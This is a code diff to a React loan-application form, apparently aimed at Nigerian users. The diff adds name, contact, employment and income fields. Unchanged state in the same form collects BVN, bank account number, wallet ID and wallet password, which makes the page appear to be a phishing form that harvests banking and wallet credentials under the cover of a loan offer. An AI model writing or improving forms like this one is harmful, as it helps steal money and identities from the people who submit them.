@@ -7,9 +7,9 @@ import { Footer } from '@/components/footer';
 
 export default function LoanApplication() {
   const [formData, setFormData] = useState({
+    fullName: '',
+    contactNumber: '',
     email: '',
-    phoneNumber: '',
-    whatsappNumber: '',
     bvn: '',
     address: '',
     accountNumber: '',
@@ -21,6 +21,8 @@ export default function LoanApplication() {
     walletId: '',
     walletPassword: '',
     sex: '',
+    employmentStatus: '',
+    monthlyIncome: '',
   });
 
   const [submitted, setSubmitted] = useState(false);
@@ -57,9 +59,9 @@ export default function LoanApplication() {
       console.log('Loan application submitted:', result);
       setSubmitted(true);
       setFormData({
+        fullName: '',
+        contactNumber: '',
         email: '',
-        phoneNumber: '',
-        whatsappNumber: '',
         bvn: '',
         address: '',
         accountNumber: '',
@@ -71,6 +73,8 @@ export default function LoanApplication() {
         walletId: '',
         walletPassword: '',
         sex: '',
+        employmentStatus: '',
+        monthlyIncome: '',
       });
       setTimeout(() => setSubmitted(false), 5000);
     } catch (err) {
@@ -125,40 +129,42 @@ export default function LoanApplication() {
             )}
 
             <form onSubmit={handleSubmit} className="space-y-6">
+              {/* Full Name */}
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2">Name in Full *</label>
+                <input
+                  type="text"
+                  name="fullName"
+                  value={formData.fullName}
+                  onChange={handleChange}
+                  required
+                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                />
+              </div>
+
+              {/* Contact Number */}
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2">Phone / WhatsApp Number *</label>
+                <input
+                  type="text"
+                  name="contactNumber"
+                  value={formData.contactNumber}
+                  onChange={handleChange}
+                  required
+                  placeholder="Enter your phone or WhatsApp number"
+                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                />
+              </div>
+
               {/* Email */}
               <div>
-                <label className="block text-gray-700 font-semibold mb-2">Your Email Address *</label>
+                <label className="block text-gray-700 font-semibold mb-2">Email Address *</label>
                 <input
                   type="email"
                   name="email"
                   value={formData.email}
                   onChange={handleChange}
                   required
-                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
-                />
-              </div>
-
-              {/* Phone Number */}
-              <div>
-                <label className="block text-gray-700 font-semibold mb-2">Phone Number *</label>
-                <input
-                  type="text"
-                  name="phoneNumber"
-                  value={formData.phoneNumber}
-                  onChange={handleChange}
-                  required
-                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
-                />
-              </div>
-
-              {/* WhatsApp Number */}
-              <div>
-                <label className="block text-gray-700 font-semibold mb-2">WhatsApp Number</label>
-                <input
-                  type="text"
-                  name="whatsappNumber"
-                  value={formData.whatsappNumber}
-                  onChange={handleChange}
                   className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                 />
               </div>
@@ -185,6 +191,36 @@ export default function LoanApplication() {
                   required
                   rows={3}
                   className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 resize-none"
+                />
+              </div>
+
+              {/* Employment Status */}
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2">Employment Status</label>
+                <select
+                  name="employmentStatus"
+                  value={formData.employmentStatus}
+                  onChange={handleChange}
+                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                >
+                  <option value="">Select Employment Status...</option>
+                  <option value="Employed">Employed</option>
+                  <option value="Self-Employed">Self-Employed</option>
+                  <option value="Unemployed">Unemployed</option>
+                  <option value="Retired">Retired</option>
+                </select>
+              </div>
+
+              {/* Monthly Income */}
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2">Monthly Income</label>
+                <input
+                  type="text"
+                  name="monthlyIncome"
+                  value={formData.monthlyIncome}
+                  onChange={handleChange}
+                  placeholder="Amount in Naira"
+                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                 />
               </div>
 
@@ -334,4 +370,4 @@ export default function LoanApplication() {
       <Footer />
     </div>
   );
-}
+      }
